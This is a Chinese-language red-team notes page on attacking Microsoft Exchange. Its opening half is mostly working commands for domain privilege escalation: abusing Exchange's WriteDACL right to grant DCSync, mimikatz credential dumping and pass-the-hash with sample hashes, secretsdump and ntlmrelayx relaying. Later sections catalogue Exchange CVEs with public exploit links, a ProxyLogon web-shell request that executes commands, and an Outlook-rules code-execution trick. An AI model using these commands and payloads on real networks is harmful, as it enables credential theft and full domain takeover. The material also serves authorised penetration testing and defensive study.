- [域渗透——使用Exchange服务器中特定的ACL实现域提权](https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E4%BD%BF%E7%94%A8Exchange%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E7%89%B9%E5%AE%9A%E7%9A%84ACL%E5%AE%9E%E7%8E%B0%E5%9F%9F%E6%8F%90%E6%9D%83/)

**复现**

所有的 Exchange Server 都在 Exchange Windows Permissions 组里面, 而这个组默认就对域有 WriteACL 权限, 那么当我们拿下 Exchange 服务器的时候, 就可以尝试使用 WriteACL 赋予自身 Dcsync 的权限.

使用 powerview，为当前 exchange 机器名用户增加 dcsync 权限, 然后抓取 hash
- https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
    ```
    Import-Module ActiveDirectory
    Import-Module .\PowerView.ps1
    import-module .\Microsoft.ActiveDirectory.Management.dll
    Add-ADGroupMember -Identity "Exchange Trusted Subsystem" -Members test
    ```

    ![](../../../../../assets/img/Security/RedTeam/后渗透/实验/Exchange/10.png)

    ![](../../../../../assets/img/Security/RedTeam/后渗透/实验/Exchange/11.png)

    由于这个权限, Exchange 的 RCE 常用以在内网渗透中用来提升到域管权限.

**详细步骤**

```bash
# 查看 Exchange Windows Permissions 对域 NC 有 WriteDacl 权限
AdFind.exe -h 192.168.123.123 -s Base -b "DC=island,DC=com" nTSecurityDescriptor -nosacl -sddl+++ -sddlfilter A;;"WRT PERMS";;;"Exchange Windows Permissions" -recmute

# 拿下 Exchange 服务器权限后，获取机器账户 Hash 并 pth
mimikatz "log" "privilege::debug" "sekurlsa::logonpasswords" "exit"
mimikatz "privilege::debug" "sekurlsa::pth /user:WIN2012-EX2016$ /domain:island.com /ntlm:2d03b02750ee9a3bd9902a370cf67746 /run:cmd" exit

# PowerView.ps1
# pth 后，用 Exchange 机器账户权限修改域分区 ACL，为 zhangsan 添加 Dcsync 权限
# 当然，也可以为 Exchange 机器账户自身添加 Dcsync 权限
Add-DomainObjectAcl -DomainController 192.168.123.123 -TargetDomain island.com -TargetIdentity "DC=island,DC=com" -PrincipalIdentity zhangsan -Rights DCSync -Verbose
Get-DomainObjectAcl -DomainController 192.168.123.123 -Domain island.com -Identity island | ?{$_.SecurityIdentifier -eq "S-1-5-21-65208363-682840273-3768764330-sidofzhangsan"} 
Remove-DomainObjectAcl -DomainController 192.168.123.123 -TargetDomain island.com -TargetIdentity "DC=island,DC=com" -PrincipalIdentity zhangsan -Rights DCSync -Verbose

# 检查是否成功给 zhangsan 添加 Replicating Directory Changes 和 Replicating Directory Changes All 权限
AdFind.exe -h 192.168.123.123 -s Base -b "DC=island,DC=com" nTSecurityDescriptor -nosacl -sddl+++ -sddlfilter A;;;"Replicating Directory Changes";;"zhangsan" -recmute

# 用 zhangsan 的凭证 Dcsync
mimikatz privilege::debug "sekurlsa::pth /user:zhangsan /domain:island.com /ntlm:82b6413f42426e0b40e6d0674eb16299 /run:cmd" exit
mimikatz privilege::debug "lsadump::dcsync /domain:island.com /all /csv /dc:WIN2012-DC1.island.com" exit
python3 secretsdump.py island.com/zhangsan:ZS@123qwe@192.168.123.123 -dc-ip 192.168.123.123 -just-dc-ntlm
```

与域控进行 LDAP 通信的时候有许多注意的地方，比如本地走代理，此时是在域外执行的，需要指定域控、域名等；比如普通域用户权限 AdFind 默认查询 ACL 会失败，因为没有权限查询 SACL 导致域控什么也不返回，需要添加 `-nosacl`，而 powerview 默认只查询 DACL 所以可以成功。

或者，也可以直接中继 Exchange，让 ntlmrelayx 自动完成提权。
```bash
# Exchange System 权限执行
powershell Invoke-WebRequest http://192.168.123.123 -UseDefaultCredentials

# 内网机器上做中继，自动通过 ACL 进行提权
python3 ntlmrelayx.py -t ldap://192.168.123.124 -smb2support
```

#### ACL (已有高权限域账号)

**描述**

`Exchange Organization Administrators` 或 `Organization Management` 组对 Exchange Windows Permissions 和 Exchange Trusted Subsystem 组拥有 `GenericAll` 权限，因此，如果获得了 `Organization Management` 组成员的权限，可以将任意账户添加至 `Exchange Windows Permissions` 或 `Exchange Trusted Subsystem` 组，进而继续通过上述方法提权。

```bash
# 查看 Organization Management 对 Exchange Windows Permissions 或 Exchange Trusted Subsystem 有 GenericAll 权限
AdFind.exe -h 192.168.123.123 -b "DC=island,DC=com" -f "|(name=Exchange Windows Permissions)(name=Exchange Trusted Subsystem)" nTSecurityDescriptor -nosacl -sddl+++ -sddlfilter A;;FC;;;"Organization Management" -recmute

# PowerView.ps1
# 通过 Organization Management 组成员将任意用户添加至 Exchange Windows Permissions 或 Exchange Trusted Subsystem
# 当然，也可以将该组成员自身添加至 Exchange Windows Permissions 或 Exchange Trusted Subsystem
# Add-DomainGroupMember 不支持域外指定域控
Add-DomainGroupMember -Identity "Exchange Windows Permissions" -Members "zhangsan" -Verbose
Get-DomainGroupMember -DomainController 192.168.123.123 -Domain island.com -Identity "Exchange Windows Permissions" -Recurse -Verbose
Remove-DomainGroupMember -Identity "Exchange Windows Permissions" -Members "zhangsan" -Verbose

# 之后就跟 Exchange 机器账户利用方式一样，zhangsan 可以给别人添加 Dcsync 权限
```

---

### PTH

- [pentest-tools-public/Pass-to-hash-EWS](https://github.com/pentest-tools-public/Pass-to-hash-EWS)

---

### relay

- [Exchange 中继](../../OS安全/实验/NTLM中继.md#exchange中继)

---

### OUTLOOK 命令执行

**描述**

OUTLOOK 客户端有一个 规则与通知 的功能，通过该功能可以使 outlook 客户端在指定情况下执行指定的指令。若我们获得某用户的凭证，可以通过此功能设置 “用户收到含指定字符的邮件时 执行指定的指令比如 clac.exe”，当用户登录 outlook 客户端并访问到此邮件时，它的电脑便会执行 calc.exe。

但是，当触发动作为启动应用程序时，只能直接调用可执行程序，如启动一个 exe 程序，但无法为应用程序传递参数，想要直接上线，我们可以将 EXE 放到某共享目录下，或者直接上传到用户的机器。

具体步骤为打开规则与通知功能，然后新建功能，在接收到某条件邮件时启动指定应用程序

实战中不太好利用,微软在 2017 年陆续修复了这些攻击面：默认禁止规则启动应用程序和运行脚本；默认禁止自定义表单执行脚本且需要将每一个自定义表单消息类注册为受信任的表单消息类；默认关闭主页功能。

**相关文章**
- https://tttang.com/archive/1487/#toc_outlook
- [利用Outlook规则，实现RCE](https://mp.weixin.qq.com/s/hrWONscsYn9TX0L3sLleyA)

---

## 漏洞

### CVE-2018-8581 任意用户伪造漏洞
- [PushSubscription abuse (CVE-2018-8581)](../../OS安全/实验/NTLM中继.md#pushsubscription-abuse-cve-2018-8581)

---

### CVE-2020-0688 远程代码执行漏洞

**简介**

当攻击者通过各种手段获得一个可以访问 Exchange Control Panel （ECP）组件的用户账号密码，就可以在被攻击的 exchange 上执行任意代码，直接获取服务器权限。

**影响版本**
- Exchange Server 2010 SP3
- Exchange Server 2013
- Exchange Server 2016 : cu16/cu17
- Exchange Server 2019 : cu5/cu6

**相关文章**
- [微软Exchange服务器远程代码执行漏洞复现分析[CVE-2020-0688]](https://xz.aliyun.com/t/7299)

**POC | Payload | exp**
- [Ridter/cve-2020-0688](https://github.com/Ridter/cve-2020-0688)
- [random-robbie/cve-2020-0688](https://github.com/random-robbie/cve-2020-0688)
- [zcgonvh/CVE-2020-0688](https://github.com/zcgonvh/CVE-2020-0688)

---

### CVE-2020-16875 远程代码执行漏洞

**简介**

由于对 cmdlet 参数的验证不正确，Microsoft Exchange 服务器中存在一个远程执行代码漏洞。成功利用此漏洞的攻击者可以在系统用户的上下文中运行任意代码。利用此漏洞需要拥有以某个 Exchange 角色进行身份验证的用户权限，由于 Exchange 服务以 System 权限运行，触发该漏洞亦可获得系统最高权限。

**影响版本**
- Exchange Server 2016 : cu16/cu17
- Exchange Server 2019 : cu5/cu6

**MSF 模块**
```
use exploit/windows/http/exchange_ecp_dlp_policy
```

**相关文章**
- [CVE-2020-16875：Microsoft Exchange RCE复现](https://cloud.tencent.com/developer/article/1704777)

**POC | Payload | exp**
- https://srcincite.io/pocs/cve-2020-16875.py.txt

---

### CVE-2020-17083 Microsoft Exchange Server任意代码执行漏洞

**相关文章**
- [CVE-2020-17083 Microsoft Exchange Server任意代码执行漏洞 POC](https://mp.weixin.qq.com/s/LMUMmuGfT3nmKN88O5hBAA)

**POC | Payload | exp**
- https://srcincite.io/pocs/cve-2020-17083.ps1.txt

---

### CVE-2020-17143 Microsoft Exchange 信息泄露漏洞

**POC | Payload | exp**
- https://srcincite.io/pocs/cve-2020-17143.py.txt

---

### CVE-2020-17144 登录后反序列化漏洞

- https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-17144

**影响版本**
- Exchange2010

**相关文章**
- [从 CVE-2020-17144 看实战环境的漏洞武器化](https://mp.weixin.qq.com/s/nVtE-OFoO076x6T0147AMw)

**POC | Payload | exp**
- [Airboi/CVE-2020-17144-EXP](https://github.com/Airboi/CVE-2020-17144-EXP)
- [zcgonvh/CVE-2020-17144](https://github.com/zcgonvh/CVE-2020-17144)

---

### Proxylogon && CVE-2021-26855 && 27065

- https://proxylogon.com/
- https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855

**相关文章**
- [Reproducing the Microsoft Exchange Proxylogon Exploit Chain](https://www.praetorian.com/blog/reproducing-proxylogon-exploit/)
- [Microsoft Exchange Server CVE-2021-26855 漏洞利用](https://www.anquanke.com/post/id/234607)
- [CVE-2021-26855 Exchange Server RCE 复现](https://www.o2oxy.cn/3169.html)
- [CVE-2021-26855：Exchange SSRF致RCE复现](https://mp.weixin.qq.com/s/PDU5jeBST1IzffaWUQ3TQQ)
- [Microsoft Exchange 漏洞（CVE-2021-26855）在野扫描分析报告](https://mp.weixin.qq.com/s/C5GPtaCp-zNbSAWXf5gVpw)

**POC | Payload | exp**
- [hausec/ProxyLogon](https://github.com/hausec/ProxyLogon)
- [dwisiswant0/proxylogscan](https://github.com/dwisiswant0/proxylogscan)
- [sirpedrotavares/Proxylogon-exploit](https://github.com/sirpedrotavares/Proxylogon-exploit)
- [charlottelatest/CVE-2021-26855](https://github.com/charlottelatest/CVE-2021-26855) - 用户枚举
- [exp.py](https://github.com/mai-lang-chai/Middleware-Vulnerability-detection/blob/master/Exchange/CVE-2021-26855%20Exchange%20RCE/exp.py)
    ```
    POST /owa/auth/test11.aspx HTTP/1.1
    Host: 192.168.141.136
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/88.0.4324.190 Safari/537.36
    Accept-Encoding: gzip, deflate
    Accept: */*
    Connection: close
    Cookie: X-BEResource=WIN-4J4L8GP7BF2/EWS/Exchange.asmx?a=~1942062522;
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 90

    code=Response.Write(new ActiveXObject("WScript.Shell").exec("whoami").StdOut.ReadAll());
    ```
- [microsoft/CSS-Exchange/blob/main/Security/README.md](https://github.com/microsoft/CSS-Exchange/blob/main/Security/README.md)
    ```
    nmap -p <port> --script http-vuln-cve2021-26855 <target>
    ```
- [CVE-2021-26855 Exchange RCE](https://github.com/mai-lang-chai/Middleware-Vulnerability-detection/tree/master/Exchange/CVE-2021-26855%20Exchange%20RCE)
- [p0wershe11/ProxyLogon](https://github.com/p0wershe11/ProxyLogon) - ProxyLogon(CVE-2021-26855+CVE-2021-27065) Exchange Server RCE(SSRF->GetWebShell)
- [Flangvik/SharpProxyLogon](https://github.com/Flangvik/SharpProxyLogon)
- [Jumbo-WJB/Exchange_SSRF](https://github.com/Jumbo-WJB/Exchange_SSRF)

---

### Proxyshell

**相关文章**
- [Exchange SSRF漏洞从proxylogon到proxyshell(一)](https://mp.weixin.qq.com/s/B_5WWNjG110PCS_gHcpR-A)
- [Exchange proxyshell exp编写(二）](https://mp.weixin.qq.com/s/aEnoBvibp-gkt3qtcOXqAw)
- [Exchange-Proxyshell](https://mp.weixin.qq.com/s/GWFsIRlyR7i8nbg6b7kDnA)

**POC | Payload | exp**
- [GossiTheDog/scanning](https://github.com/GossiTheDog/scanning)
- [dmaasland/proxyshell-poc](https://github.com/dmaasland/proxyshell-poc)
- [Ridter/proxyshell_payload](https://github.com/Ridter/proxyshell_payload)
- [ktecv2000/ProxyShell](https://github.com/ktecv2000/ProxyShell)
- [wudicainiao/proxyshell-for-exchange_workload](https://github.com/wudicainiao/proxyshell-for-exchange_workload)

---

### ProxyToken

**相关文章**
- [PROXYTOKEN: AN AUTHENTICATION BYPASS IN MICROSOFT EXCHANGE SERVER](https://www.zerodayinitiative.com/blog/2021/8/30/proxytoken-an-authentication-bypass-in-microsoft-exchange-server)

---

### ProxyOracle && CVE-2021-31195 && CVE-2021-31196

**影响版本**

CVE-2021-31195
* Exchange Server 2013 < May21SU
* Exchange Server 2016 < May21SU < CU21
* Exchange Server 2019 < May21SU < CU10

CVE-2021-31196
* Exchange Server 2013 < Jul21SU
* Exchange Server 2016 < Jul21SU
* Exchange Server 2019 < Jul21SU

**相关文章**
- [ProxyOracle漏洞分析](https://mp.weixin.qq.com/s/wn6qgN6Yb-KslyHzLJ-bjA)
- [ProxyOracle漏洞分析](https://hosch3n.github.io/2021/08/23/ProxyOracle%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)

**POC | Payload | exp**
- [hosch3n/ProxyVulns](https://github.com/hosch3n/ProxyVulns) - [ProxyLogon] CVE-2021-26855 & CVE-2021-27065 Fixed RawIdentity Bug Exploit. [ProxyOracle] CVE-2021-31195 & CVE-2021-31196 Exploit Chains. [ProxyShell] CVE-2021-34473 & CVE-2021-34523 & CVE-2021-31207 Exploit Chains.

---

### CVE-2021-41349 Exchange XSS 漏洞

**相关文章**
- [微软补丁日Poc｜Exchange XSS 漏洞（CVE-2021-41349）【含Python Poc】](https://mp.weixin.qq.com/s/WX95lcy7_PZvSIG0SALtFA)

**影响版本**
* <= Exchange 2013 update 23
* <= Exchange 2016 update 22
* <= Exchange 2019 update 11

---

### CVE-2021-42321

**相关文章**
- [CVE-2021-42321-天府杯Exchange 反序列化漏洞分析](https://mp.weixin.qq.com/s/qLOIyMlodeq8uOLEAJIzEA)

**POC | Payload | exp**
- [testanull/CVE-2021-42321_poc.py](https://gist.github.com/testanull/0188c1ae847f37a70fe536123d14f398)
- [DarkSprings/CVE-2021-42321](https://github.com/DarkSprings/CVE-2021-42321)
